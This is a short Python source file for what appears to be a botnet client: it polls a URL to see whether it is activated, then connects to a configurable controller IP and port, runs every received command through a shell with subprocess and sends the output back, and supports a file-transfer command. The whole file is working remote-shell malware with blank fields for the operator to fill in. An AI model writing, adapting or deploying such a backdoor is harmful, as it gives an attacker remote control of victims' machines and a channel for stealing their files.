#! /usr/bin/env python3

import modules, urllib.request, time, socket, subprocess


botname = ''			# Put name of bot here
host = '127.0.0.1'		# Put controller IP here
port = 8080				# Put controller listening port here
connections = {
	'source':'',		# Put URL for update here. Leave blank for manual only.
	'instruction':''	# Put url for currently active device here. if source is set to 'manual', the bot will automatially start.
}

if connections['instruction'] == 'manual':
	ACTIVE = 'manual'
else:
	ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname ) # finds if instruction matches current bot

# connection ============================================= #
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print( "[CCCli] Attempting to connect to {} on port {} ...".format(host, port) )
	s.connect((host, port))

	while True: 
		command = s.recv(1024).decode()

		if '==terminate' in command:
			s.close()
			break
		elif '==transfer' in command: # we use 'in' here since there will be more arguments.
			cmd,path = command.split('*')

			try:
				modules.transfer(s,path)
			except Exception as e:
				s.send ( str(e) ) # send the exception error
				pass
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send( CMD.stdout.read() ) 
			s.send( CMD.stderr.read() )
# ======================================================== #

while True: # Tests for instruction every 10 seconds.
	if ACTIVE == False:
		if connections['instruction'] != 'manual':
			ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname )
		time.sleep(10)
		continue
	elif ( ACTIVE == True ) or ( ACTIVE == 'manual' ):
		connect()